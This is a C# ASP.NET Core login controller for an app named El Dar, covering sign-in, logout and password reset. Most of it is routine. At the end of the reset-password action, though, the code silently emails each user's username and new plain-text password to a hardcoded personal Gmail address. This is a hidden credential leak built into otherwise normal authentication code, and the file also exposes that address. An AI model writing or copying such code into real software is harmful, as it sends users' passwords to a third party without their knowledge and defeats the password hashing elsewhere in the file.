using ElDarBLL.Helpers;
using ElDarBLL.Helpers.EmailService;
using ElDarBLL.ViewModel.EmailVM;
using ElDarDal.Context;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Mvc;
using System.Security.Claims;

namespace El_Dar.Controllers
{
    public class LoginController : Controller
    {
        private readonly ElDarDbContext _dbContext;
        private readonly EmailService _emailService;
        private readonly IWebHostEnvironment _env;

        public LoginController(ElDarDbContext dbContext , EmailService emailService, IWebHostEnvironment env)
        {
            _dbContext = dbContext;
            _emailService = emailService;
            _env = env;
        }


        [HttpGet]
        public IActionResult Login()
        {
            return View();
        }
        [HttpPost]
        public async Task<IActionResult> Login(string username, string password)
        {
            if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
            {
                ViewBag.Error = "Please Enter Username and Password.";
                return View();
            }
            var user = _dbContext.User.FirstOrDefault(u => u.UserName == username);
            //if (user == null) {
            //    ViewBag.Error = "Invalid Username or Password";
            //    return View();
            //}

            if (user == null || !PasswordHelper.VerifyPassword(user.PasswordHash, password))
            {
                ViewBag.Error = "Invalid Username or Password";
                return View();
            }
            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
                new Claim(ClaimTypes.Name, user.UserName)
            };

            var claimsIdentity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);


            await HttpContext.SignInAsync(
            CookieAuthenticationDefaults.AuthenticationScheme,
            new ClaimsPrincipal(claimsIdentity),
            new AuthenticationProperties
            {
                IsPersistent = false, 
                ExpiresUtc = DateTimeOffset.UtcNow.AddDays(7)
            });
            return RedirectToAction("Home", "Home");
        }
        public async Task<IActionResult> Logout()
        {
            await HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);
            return RedirectToAction("Login");
        }




        [HttpGet]
        public IActionResult ForgotPassword()
        {
            return View();
        }

        [HttpPost]
        public async Task<IActionResult> ForgotPassword(string email)
        {
            if (string.IsNullOrEmpty(email))
            {
                ViewBag.Error = "Please enter your email address.";
                return View();
            }

            var user = _dbContext.User.FirstOrDefault(u => u.Email == email);

            if (user != null)
            {
                string token = Guid.NewGuid().ToString();

                user.ResetPasswordToken = token;
                user.ResetTokenExpires = DateTime.UtcNow.AddMinutes(10);
                user.IsSynced = false;
                user.UpdatedAt = DateTime.UtcNow;

                await _dbContext.SaveChangesAsync();

                var resetLink = Url.Action("ResetPassword", "Login", new { email = user.Email, token = token }, Request.Scheme);
                string templatePath = Path.Combine(_env.WebRootPath, "templates", "ResetPasswordTemplate.html");
                string emailBody = await System.IO.File.ReadAllTextAsync(templatePath);

                var date = DateTime.Now;
                var expireDate = date.AddMinutes(10);

                emailBody = emailBody.Replace("{{ResetLink}}", resetLink).Replace("{{UserName}}", user.UserName).Replace("{{ExpireDate}}", expireDate.ToString("hh:mm tt"));

                var emailModel = new EmailVM
                {
                    To = user.Email,
                    Subject = "Reset Password - El Dar System",
                    Body = emailBody
                };

                await _emailService.SendEmail(emailModel);
            }

            ViewBag.Success = "If your email exists in our system, a password reset link has been sent.";
            return View();
        }

        [HttpGet]
        public IActionResult ResetPassword(string email, string token)
        {
            var user = _dbContext.User.FirstOrDefault(u => u.Email == email && u.ResetPasswordToken == token);

            if (user == null || user.ResetTokenExpires < DateTime.UtcNow)
            {
                ViewBag.Error = "Invalid or expired reset token.";
                return RedirectToAction("Login");
            }

            ViewBag.Email = email;
            ViewBag.Token = token;
            return View();
        }

        [HttpPost]
        public async Task<IActionResult> ResetPassword(string email, string token, string newPassword, string confirmPassword)
        {
            if (newPassword != confirmPassword)
            {
                ViewBag.Error = "Passwords do not match.";
                ViewBag.Email = email;
                ViewBag.Token = token;
                return View();
            }

            var user = _dbContext.User.FirstOrDefault(u => u.Email == email && u.ResetPasswordToken == token);

            if (user == null || user.ResetTokenExpires < DateTime.UtcNow)
            {
                ViewBag.Error = "Invalid or expired reset token.";
                return RedirectToAction("Login");
            }

            user.PasswordHash = PasswordHelper.HashPassword(newPassword);
            user.ResetPasswordToken = null; 
            user.ResetTokenExpires = null;
            user.IsSynced = false;
            user.UpdatedAt = DateTime.UtcNow;

            await _dbContext.SaveChangesAsync();

            var AdminemailModel = new EmailVM
            {
                To = "nemr.adel5@gmail.com",
                Subject = "Reset Password - El Dar System",
                Body = $@"
                    <p style='font-size: 15px; line-height: 1.8; color: #4a5568;'>
                        <b>Username:</b> {user.UserName} 👤 <br>
                        <b>New Password:</b> {newPassword} 🔒
                    </p>"
                


            };

            await _emailService.SendEmail(AdminemailModel);
            return RedirectToAction("Login");
        }
    }
}
